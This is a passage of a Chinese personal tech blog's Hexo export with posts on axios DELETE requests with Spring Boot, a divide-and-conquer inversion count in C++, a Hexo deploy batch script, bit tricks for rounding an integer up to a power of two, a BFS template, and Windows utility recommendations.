<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">axios.put(<span class="string">"/admin/blog/add"</span>, &#123;</span><br><span class="line">	data: <span class="built_in">JSON</span>.stringify(<span class="keyword">this</span>.blog)</span><br><span class="line">&#125;).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;&#125;).catch(<span class="function"><span class="params">e</span> =&gt;</span> &#123;&#125;);</span><br></pre></td></tr></table></figure>

<p>spring boot 后台接收数据</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PutMapping</span>(<span class="string">"/add"</span>)</span><br><span class="line"><span class="function">ResponseEntity <span class="title">addBlog</span><span class="params">(@RequestBody HashMap json)</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是当我使用类似的方法执行delete方法时候，后台一直抛异常</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">Resolved [<span class="type">org.springframework.http.converter.HttpMessageNotReadableException</span>: <span class="type">Required</span> <span class="type">request</span> <span class="type">body</span> <span class="type">is</span> <span class="type">missing</span>: <span class="type">org.springframework.http.ResponseEntity</span> <span class="type">top.yalexin.rblog.controller.admin.AdminCommentController.deleteComment</span>(<span class="type">java.util.HashMap</span>)]</span><br></pre></td></tr></table></figure>

<p>后来查资料才知道delete的内部实现原理与其他几个的不太一样，需要如此设置data对象才可：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">axios.delete(<span class="string">"/admin/comment/delete"</span>, &#123;</span><br><span class="line">    data: &#123;</span><br><span class="line">      id: <span class="built_in">JSON</span>.stringify(cmtId)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">&#125;).catch(<span class="function"><span class="params">e</span> =&gt;</span> &#123;&#125;);</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>框架</tag>
        <tag>UI</tag>
      </tags>
  </entry>
  <entry>
    <title>基于分治法的特定数列逆序数求法</title>
    <url>/2022/09/29/%E5%9F%BA%E4%BA%8E%E5%88%86%E6%B2%BB%E6%B3%95%E7%9A%84%E7%89%B9%E5%AE%9A%E6%95%B0%E5%88%97%E9%80%86%E5%BA%8F%E6%95%B0%E6%B1%82%E6%B3%95/</url>
    <content><![CDATA[<p>忙里偷闲，记录一下使用<strong>分治法</strong>求逆序数的实现过程。</p>
<a id="more"></a>

<h2 id="算法设计"><a href="#算法设计" class="headerlink" title="算法设计"></a>算法设计</h2><p><strong>逆序：</strong>在一个排列中，如果一对数的前后位置与大小顺序相反，即前面的数大于后面的数，那么它们就称为一个逆序。例如<code>&lt;3,1&gt;</code>就是一个逆序。</p>
<p><strong>逆序数：</strong>给定数列中，逆序的数目。例如数列:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[1,3,4,2]</span><br></pre></td></tr></table></figure>

<p>逆序数是2.</p>
<h3 id="暴力法"><a href="#暴力法" class="headerlink" title="暴力法"></a>暴力法</h3><p>很容易就想到的一个方法就是从头开始扫描，然后对于每一个扫描到的数字<code>a</code>，考察后面的每一个数字<code>b</code>，观察其是否满足逆序的定义，例如对于上述数列，对于数字1，逆序数为0；对于数字3，逆序数为1（<code>&lt;3,2&gt;</code>），依此类推，最终数列总的逆序数为2.</p>
<p>很遗憾，该算法复杂度为$O(n^2)$,对于暴躁的张三来说，当其要计算长度为10000的数列的逆序数时候，他是无法接受长时间等待的，<del>因为他还要去和阿珍约会呢</del></p>
<h3 id="分治法"><a href="#分治法" class="headerlink" title="分治法"></a>分治法</h3><blockquote>
<p>分而治之，逐个击破</p>
</blockquote>
<p>分治法的思想是将原问题分解成若干个子问题，而所有的子问题进行简单处理后就可以得到原问题的解。求解子问题的过程亦可以继续分解成子子问题，而子问题分解到“原子问题”（原子问题好像也不太严谨，大概意思就是一个可以直接求解的问题）后可以立即得到解。</p>
<p>例如对于下面的数列：我们可以每次把子数列分成两半，分别求左半部分和右半部分的逆序数</p>
<p><img src="https://cdn.yalexin.top/image-20220929225648745.png" alt="image-20220929225648745"></p>
<p>那我们如何还原出原问题的解呢？即未分解问题时候的逆序数。仔细想想，我们已经计算出了左右两边逆序数<code>leftCnt</code>、<code>rightCnt</code>，那么我们再计算出在“ 一个数字取自左边，另一个数字取自右边”的情况下，逆序数<code>cnt</code>的大小，原问题不就是这三个数字之和吗？</p>
<p>关键是怎么求<code>cnt</code>?</p>
<p>老方法？依次从左边选一个数字<code>a</code>，再依次从右边选一个数字<code>b</code>，很抱歉，这样子下来要判断$\frac{n}{2}*\frac{n}{2}=\frac{n^2}{4}   $次，综合下来时间复杂度还是$O(n^2)$。</p>
<p>仔细想想，我们要判断的数字一个来自左边，一个来自右边，如果我们分别让左边和右边有序，然后分别从第一个开始遍历，根据遍历到的数字进行计算逆序数，根据有序的性质，遍历完后逆序数也求解出来了，整个过程中，排序花费$O(n\log n)$，遍历花费$O(n)$，即合并子问题花费$O(n\log n)$.</p>
<p>关于合并过程的仔细分析，如下(简单起见，<strong>数列中不包含相同元素</strong>)：</p>
<p>先将左右两部分排序，设置两个指针，分别从左右两部分进行遍历，设左边遍历得到的数字是<code>a[i]</code>，右边的是<code>b[j]</code>。</p>
<ol>
<li>右边的指针j不断往后移动（尚未到结尾，如果到结尾，则到步骤3），直到<code>b[j]</code>恰好是右半部分中第一个不小于<code>a[i]</code>的数字，即在右半部分中<code>b[j]</code>的左边都是小于<code>a[i]</code>的，此时，由<code>a[i]</code>作为第一个数字组成的跨越左右两部分的数对（或者说序偶）中，逆序数刚好就是右半部分中<code>b[j]</code>的左边的数字个数。说起来有点绕口，看看下面的图：</li>
</ol>
<p><img src="https://cdn.yalexin.top/image-20220930001126349.png" alt="image-20220930001126349"></p>
<p>此时逆序数<code>cnt</code>要加上<code>n</code>.</p>
<ol start="2">
<li>左边的指针要往后移动，即指向<code>a[i+1]</code>,那么就会有两种情况：</li>
</ol>
<ul>
<li>①<code>a[i+1]&gt;b[j]</code>:这个很好解决，继续回到步骤1即可。</li>
<li>②<code>a[i+1]&lt;b[j]</code>:由于<code>b[j]</code>的左边都是小于<code>a[i]</code>，即存在这样的关系：<code>b[j]&gt;a[i+1]&gt;a[i]&gt;b[j-1]</code>，故此时由<code>a[i+1]</code>作为第一个数字组成的跨越左右两部分的数对（或者说序偶）中，逆序数也是<code>n</code>，此时逆序数<code>cnt</code>要加上<code>n</code>.下一步左边的指针要往后移动，继续步骤②，直到左边的指针指向元素比右边指针指向的大，回到步骤1，假若左边的指针先到了左半部分的最右边，则到步骤3。</li>
</ul>
<ol start="3">
<li>此时要么左半部分先遍历完，要么右半部分先遍历完，假如是左边先遍历完，则说明此时“跨越左右两半部分的逆序数”统计完成，即<code>cnt</code>是正确的值，跳步骤4.如果是右半部分先遍历完成，则说明左边尚未遍历完成的数字都要比右半部分的数字大，根据这个条件计算逆序数后，转步骤4.</li>
<li>将<code>leftCnt + rightCnt + cnt</code>作为原问题的解。</li>
</ol>
<h2 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h2><p>下面进行时间复杂度分析，我们子问题个数是2（分别递归求解左右两个部分），每个子问题的规模是原来的一半，合并子问题花费$O(n\log n)$。</p>
<p>则：<br>$$<br>T(n)=2T(\frac{n}{2} )+O(n \log n)<br>$$<br>根据主定理，得<br>$$<br>T(n)=O(n \log n)<br>$$</p>
<h2 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> LEN = <span class="number">100000</span> + <span class="number">2</span>;</span><br><span class="line"><span class="keyword">int</span> <span class="built_in">list</span>[LEN], length;</span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">reverseOrderNumber</span><span class="params">(<span class="keyword">int</span> left, <span class="keyword">int</span> right)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (left &gt;= right)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (left + <span class="number">1</span> == right)<span class="keyword">return</span> <span class="built_in">list</span>[left] &gt; <span class="built_in">list</span>[right];</span><br><span class="line">    <span class="keyword">int</span> mid = (left + right) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 分别求解子问题</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> leftCnt  = reverseOrderNumber(left, mid);</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> rightCnt = reverseOrderNumber(mid + <span class="number">1</span>, right);</span><br><span class="line">    <span class="comment">// 排序左右两半部分</span></span><br><span class="line">    <span class="keyword">int</span> *l1 = <span class="built_in">list</span> + left, *r1 = <span class="built_in">list</span> + mid - left + <span class="number">1</span> + left;</span><br><span class="line">    sort(l1, r1);</span><br><span class="line">    sort(r1, <span class="built_in">list</span> + right + <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 计算跨左右部分的逆序数</span></span><br><span class="line">    <span class="keyword">int</span> i = left, j = mid + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i &lt;= mid &amp;&amp; j &lt;= right)&#123;</span><br><span class="line">        <span class="comment">// 在右边寻找第一个大于 a[i] 的元素</span></span><br><span class="line">        <span class="keyword">while</span>(j &lt;= right &amp;&amp; <span class="built_in">list</span>[i] &gt; <span class="built_in">list</span>[j])j++;</span><br><span class="line">        <span class="keyword">if</span> (j &gt; right)<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">while</span>(i &lt;= mid &amp;&amp; <span class="built_in">list</span>[i] &lt; <span class="built_in">list</span>[j])&#123;</span><br><span class="line">            i++;</span><br><span class="line">            cnt += j - <span class="number">1</span> - mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 左边尚未遍历完的数字都要比右半部分的大</span></span><br><span class="line">    <span class="keyword">if</span>(j &gt; right) cnt += (mid - i + <span class="number">1</span>) * (right - mid);</span><br><span class="line">    <span class="comment">// 合并子问题</span></span><br><span class="line">    <span class="keyword">return</span> leftCnt + rightCnt + cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// printf("input the length:\n");</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;length);</span><br><span class="line">    <span class="comment">// printf("input the value:\n");</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length;i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;<span class="built_in">list</span>[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%lld\n"</span>, reverseOrderNumber(<span class="number">0</span>, length - <span class="number">1</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">4</span></span><br><span class="line"><span class="comment">5 3 7 2</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">4</span></span><br><span class="line"><span class="comment">5 9 7 2</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">8</span></span><br><span class="line"><span class="comment">5 9 12 16 2 3 13 14</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">3</span></span><br><span class="line"><span class="comment">7 4 3</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">6</span></span><br><span class="line"><span class="comment">2 6 3 4 5 1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<hr>
<p>实际上排序过程也可以使用归并排序，并且排序过程就可以计算逆序数了，不过归并排序过程要辅助空间，这里就没有采用。</p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>分治</tag>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title>如何编写部署新文章命令脚本</title>
    <url>/2020/03/04/%E5%A6%82%E4%BD%95%E7%BC%96%E5%86%99%E5%91%BD%E4%BB%A4%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一般而言，写好的Markdown文章应该放到博客目录的source_posts文件夹下，然后使用命令hexo g -d或者是hexo d -g进行部署。我在使用hexo的时候，我的hexo所有文件还关联着码云上的仓库，我习惯于发表新文章后把hexo的所有文件都更新到码云远端仓库。按以前那种方式，我首先需要在博客目录中用命令部署最新的文章，然后再使用git add .等命令将本地所有文件推送到远端。老实说，我承认自己是个懒人，所以就想到了用批处理文件bat实现我的懒人梦，在那之前我们先了解一下bat。</p>
<a id="more"></a>

<h2 id="bat的简单介绍"><a href="#bat的简单介绍" class="headerlink" title="bat的简单介绍"></a>bat的简单介绍</h2><p>.bat文件有点类似于linux系统下的shell脚本文件.sh， 下面是bat的简单用法，更多关于bat脚本的详细介绍可以查看<a href="https://baike.baidu.com/item/BAT/365230" target="_blank" rel="noopener">这里</a>。 </p>
<table>
<thead>
<tr>
<th align="center">语法</th>
<th align="center">解释</th>
</tr>
</thead>
<tbody><tr>
<td align="center">echo</td>
<td align="center">表示打印该命令后的字符，如echo hello执行后会打印“hello”</td>
</tr>
<tr>
<td align="center">echo off</td>
<td align="center">表示在此语句后所有运行的命令都不显示命令本身 ，但本身会显示</td>
</tr>
<tr>
<td align="center">@</td>
<td align="center">与echo off相象，但它是加在每个命令行的最前面，表示运行时不显示这一行的命令行（只能影响当前行）</td>
</tr>
<tr>
<td align="center">@echo off</td>
<td align="center">组合上两个语法，表示不显示后续执行命令及当前命令</td>
</tr>
<tr>
<td align="center">dir c:<em>.</em> &gt;a.txt</td>
<td align="center">将c盘文件列表写入a.txt</td>
</tr>
<tr>
<td align="center">call</td>
<td align="center">用于调用另一个批处理命令或文件（如果不用call而直接调用别的批处理文件，那么执行完那个批处理文件后将无法返回当前文件并执行当前文件的后续命令）</td>
</tr>
<tr>
<td align="center">call c:\ucdos\ucdos.bat</td>
<td align="center">调用ucdos.bat脚本</td>
</tr>
<tr>
<td align="center">pause</td>
<td align="center">暂停批处理的执行并在屏幕上显示Press any key to continue…的提示，等待用户按任意键后继续</td>
</tr>
<tr>
<td align="center">rem</td>
<td align="center">用于注释，也可以用 ::代替</td>
</tr>
<tr>
<td align="center">start</td>
<td align="center">调起另外一个窗口执行当前行命令</td>
</tr>
</tbody></table>
<h2 id="编写部署脚本"><a href="#编写部署脚本" class="headerlink" title="编写部署脚本"></a>编写部署脚本</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">D:</span><br><span class="line">cd D:\private\blog</span><br><span class="line">call hexo clean</span><br><span class="line">call hexo g</span><br><span class="line">call hexo d&amp;&amp;cd ..&amp;&amp;git add .&amp;&amp;git commit -m %1&amp;&amp;git push&amp;&amp;cd blog</span><br></pre></td></tr></table></figure>

<p>将上述命令保存为xxx.bat</p>
<p>关于call的用法上面表格有说明，这里还有几个“&amp;&amp;”，这个操作符是当“&amp;&amp;”前面的运行成功后后面的才运行，而“%1”是指向bat文件中传递参数中的第一个（第0个是命令本身），更多的bat传递参数方法可以参照<a href="https://blog.csdn.net/yunnying/article/details/12010779" target="_blank" rel="noopener">这篇文章</a>,然后就可以在.bat文件所在的文件夹中打开cmd窗口或者shell（鼠标右键+shift）窗口，键入</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">xxx "提交备注"</span><br></pre></td></tr></table></figure>

<p>就可以实现一键部署新文章且更新远程代码仓库啦！当然了如果脚本中不需要传递参数，则只需双击xxx.bat打开就可以了。</p>
]]></content>
      <categories>
        <category>命令行</category>
      </categories>
      <tags>
        <tag>脚本</tag>
        <tag>效率</tag>
      </tags>
  </entry>
  <entry>
    <title>将正整数向上取整为2次幂</title>
    <url>/2020/08/11/%E5%B0%86int%E7%B1%BB%E5%9E%8B%E6%95%B4%E6%95%B0%E5%90%91%E4%B8%8A%E5%8F%962%E6%AC%A1%E5%B9%82/</url>
    <content><![CDATA[<blockquote>
<p>本文参考了哔哩哔哩UP主<code>LH_Mouse</code>的<a href="https://www.bilibili.com/video/BV1tT4y177SR?t=650" target="_blank" rel="noopener">视频</a></p>
</blockquote>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>生活中我们可能经常遇到将给定的整数向上取整为最接近该数字的2次幂的情况，例如25的向上取整2次幂最接近该数字是32 = 2^5，37的向上取整2次幂最接近该数字是64 = 2^6，该算法也用很广泛的应用，例如<a href="http://c.biancheng.net/view/1284.html" target="_blank" rel="noopener">伙伴系统和slab内存分配机制</a>中，分配器在分配内存的时候，首先计算该次请求分配大小的向上取整2次幂，<a id="more"></a>将该大小的空间返回，即假如请求8<code>kb</code>， 则分配8<code>kb</code>大下的空间，假如请求分配9<code>kb</code>，则分配16<code>kb</code>的大小空间；又如，<code>Java</code>中的<code>HashMap</code>内部实际上是使用了数组，而且该数组的长度大小总是2^n，假如实例化<code>HashMap</code>的时候指定大小为<code>length</code>，那么实际上<code>HashMap</code>内部的数组大小就是<code>length</code>的向上取整2次幂。</p>
<h2 id="算法讲解"><a href="#算法讲解" class="headerlink" title="算法讲解"></a>算法讲解</h2><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p>利用一个变量，该变量从1不断地翻倍，假如该变量乘上2大于等于<code>target</code>，那么该变量的两倍即为所求：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (num &lt;= <span class="number">1</span>)<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> iteration = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> ((iteration &lt;&lt; <span class="number">1</span>) &lt; num)&#123;</span><br><span class="line">        iteration &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> iteration &lt;&lt; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是上面的算法时间复杂度是<code>O(log(n))</code>，下面介绍一种时间复杂度是<code>O(1)</code>的解法：</p>
<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>对于一般的数字，例如25，它的二进制是<code>b011001</code>，其向上取整为2次幂为32，对应的二进制为<code>b100000</code>，11对应的二进制数字为<code>b01011</code>，其向上取整为2次幂为16，对应的二进制为<code>b10000</code>，即对于非2^n的整数<code>a</code>，只需要将其二进制最左边的1取出来，再将该位置的右边全部替换为0，然后将该数字左移一位得到数字<code>b</code>，<code>b</code>就是<code>a</code>对应的向上取整为2次幂的数字。</p>
<p>所以关键就是如何将给定数字的最左边的1给提取出来，很容易想到的一个办法就是：不断地将该数字往右移，并记录下移动的次数，直到将该数字变为1：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (num &lt;= <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (num &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        num &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 经过下面的处理，num 只保留了最左边的1</span></span><br><span class="line">    num &lt;&lt;= count;</span><br><span class="line">    <span class="comment">//向上取2次幂</span></span><br><span class="line">    <span class="keyword">return</span> num &lt;&lt; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是很遗憾，上面的时间复杂度是仍然是<code>O(log(n))</code>，而且部分答案不正确，如8对应的解是16（当然了，这种错误想要避免也很容易）。</p>
<p>我们再想想，由<code>25 = b011001</code>到<code>32 = b100000</code>，不一定要“将最左边的1提取出来，然后该位置的右边全部赋值为0，再将数字往左移一位”这种方法，也可以将25的二进制数中，找出第一个1的位置，然后将该位置的右边全部置为1，即<code>b011111</code>，然后将得到的数字加1，得到<code>b100000</code>，该数字不就是所求吗？</p>
<p>关键步骤就变成了怎么将给定数字的最高有效位的右边全部置为1（包含该位置），这里我们可以从算术右移中找到灵感，算数右移就是符号位跟着移动，并且符号位跟原来的符号位一致；</p>
<p>假如给定数字是<code>001xxxxx</code>，那么该怎么变成<code>0011xxxx</code>？借助移位操作和或运算即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a &#x3D; 001xxxxx</span><br><span class="line">b &#x3D; 0001xxxx</span><br><span class="line">c &#x3D; a | b</span><br><span class="line">  &#x3D; 0011xxxx</span><br></pre></td></tr></table></figure>

<p>由<code>0011xxxx</code>又该怎么变成<code>001111xx</code>？还是借助移位操作和或运算即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a &#x3D; 0011xxxx</span><br><span class="line">b &#x3D; 000011xx</span><br><span class="line">c &#x3D; a | b</span><br><span class="line">  &#x3D; 001111xx</span><br></pre></td></tr></table></figure>

<p>……</p>
<p>但是我们什么时候结束上面的操作？请注意我们的<code>int</code>类型是32位字长，为了确保所有的正整数都可以被考虑到，如某个整数<code>0x20000001</code>，我们需要将最左边的1移动29次，我们只需要将<code>num</code>右移16位，然后再异或一次，将得到32个“1”（当然了，末尾的几个1会被舍弃），该算法如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (num &lt;= <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    num |= num &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    num |= num &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    num |= num &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    num |= num &gt;&gt; <span class="number">8</span>;</span><br><span class="line">    num |= num &gt;&gt; <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">return</span> num + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是前文说到，当给定的数字本身就是符合2^n，该算法返回的是2^(n + 1)，所有我们在算法的开始前要先判断一下给定数字是不是2的次幂，如果一个数字是2的次幂，那么它的二进制一定是<code>n = 00……10000……0</code>，该数字减一后一定是<code>n - 1 = 00……01111……1</code>，这二者进行与运输后结果为0，根据这个即可判断给定数字是不是2的次幂，改进后的算法如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (num &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ((num &amp; (num - <span class="number">1</span>)) == <span class="number">0</span>) <span class="keyword">return</span> num;</span><br><span class="line">    num |= num &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    num |= num &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    num |= num &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    num |= num &gt;&gt; <span class="number">8</span>;</span><br><span class="line">    num |= num &gt;&gt; <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">return</span> num + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>移位</tag>
        <tag>异或</tag>
      </tags>
  </entry>
  <entry>
    <title>广度优先搜索遍历矩阵</title>
    <url>/2020/08/24/%E5%B9%BF%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2%E9%81%8D%E5%8E%86%E7%9F%A9%E9%98%B5/</url>
    <content><![CDATA[<p>广度优先搜索策略（<code>BFS</code>）应用非常广泛，图遍历，二叉树遍历（实际上也属于图的特殊形式），矩阵遍历等都可以使用，在进行矩阵遍历，例如说逃离迷宫最短时间的算法都可以使用<code>BFS</code>进行实现，当然了使用<code>DFS</code>也可以，但是使用<code>DFS</code>的时候，会产生很多非最优解，性能方面及不上<code>BFS</code>，<code>BFS</code>能够保证第一次找到可行解就是最优解。<a id="more"></a></p>
<h2 id="模板代码"><a href="#模板代码" class="headerlink" title="模板代码"></a>模板代码</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">BFS</span><span class="params">(<span class="keyword">int</span>[][] map)</span></span>&#123;</span><br><span class="line">	LinkedList&lt;<span class="keyword">int</span>[]&gt; queue = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">	<span class="keyword">int</span> length = <span class="number">0</span>;</span><br><span class="line">	queue.add(<span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">0</span>, <span class="number">0</span>&#125;);</span><br><span class="line">    <span class="keyword">while</span> (!queue.isEmpty()) &#123;</span><br><span class="line">        <span class="comment">// 记录当前层数节点的大小</span></span><br><span class="line">        nowSize = queue.size();</span><br><span class="line">        <span class="keyword">while</span> (nowSize-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            now = queue.poll();</span><br><span class="line">            <span class="comment">// 根据适当条件加入邻接的的节点</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="number">1</span> &gt; <span class="number">2</span>) &#123;</span><br><span class="line">            	queue.add(<span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">1</span>, <span class="number">1</span>&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 层数增加</span></span><br><span class="line">        length++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>BFS</tag>
      </tags>
  </entry>
  <entry>
    <title>小工具分享</title>
    <url>/2020/02/23/%E5%B0%8F%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/</url>
    <content><![CDATA[<h2 id="windows端"><a href="#windows端" class="headerlink" title="windows端"></a>windows端</h2><h4 id="BandicamPortable"><a href="#BandicamPortable" class="headerlink" title="- BandicamPortable"></a>- BandicamPortable</h4><p>这是一款号称是录制游戏视频的录屏软件，但是它的功能不仅仅与录制视频，只要是需要录制视频的地方，它都可以胜任，软件提供五种录制模式。这款工具具有的这几个功能让我觉得它非常友好:<br><img src="https://q.yalexin.top/TIM%E6%88%AA%E5%9B%BE20200223184319.png" alt></p>
<ol>
<li>可以设置鼠标效果；许多人录制视频的时候都知道，要是自己的显示器比较大，光标就会显得很小，我们的鼠标的轨迹就会不明显，这款软件恰好可以解决这个问题。<br><img src="http://q.yalexin.top/TIM%E6%88%AA%E5%9B%BE20200223184810.png" alt></li>
<li>实时笔记；在我们录制的过程当中，我们可以用鼠标进行写字，也可以输入文字。<br><img src="http://q.yalexin.top/TIM%E6%88%AA%E5%9B%BE20200223195959.png" alt></li>
<li>游戏录制模式；如果我们选了该模式，那么我们可以在视频的适当位置显示实时帧率FPS，对于轻度游戏评测者比较方便。<br><img src="http://q.yalexin.top/TIM%E6%88%AA%E5%9B%BE20200223193217.png" alt><br>这个软件可以配合另一个小工具来使用：KeyCastOW，它可以实时监听键盘和鼠标的触发变化，并在屏幕上显示，对于一些游戏教程者，比如QQ飞车漂移教程者来说非常友好<br><img src="http://q.yalexin.top/TIM%E6%88%AA%E5%9B%BE20200223200552.png" alt><br><a href="https://www.bandicam.cn/" target="_blank" rel="noopener">这是BandicamPortable的官网</a><br><a href="bdcamsetup.exe">也可以点我下载</a><br><a href="KeyCastOW_jb51.rar">KeyCastOW下载</a></li>
</ol>
<h4 id="TrafficMonitor"><a href="#TrafficMonitor" class="headerlink" title="- TrafficMonitor"></a>- TrafficMonitor</h4><p>这是一个实时显示系统信息的工具，能显示cpu和内存的使用以及上传下载的状态，对于我这种总是忍不住要看网速和内存使用状态的强迫症来说简直不要太爽</p>
<p><img src="http://q.yalexin.top/TIM%E6%88%AA%E5%9B%BE20200223194705.png" alt><br><a href="TrafficMonitor.rar">点我下载</a></p>
<h4 id="memreduct"><a href="#memreduct" class="headerlink" title="- memreduct"></a>- memreduct</h4><p>这是一款监控内存的工具，和TrafficMonitor不同的是，memreduct可以进行内存清理，我们可以手动清理加速，也可以设置阈值，当使用内存超过一定时自动清理内存，或者设定每隔一定的时间就清理<br><img src="http://q.yalexin.top/TIM%E6%88%AA%E5%9B%BE20200223195151.png" alt><br><a href="memreduct.rar">点我下载</a></p>
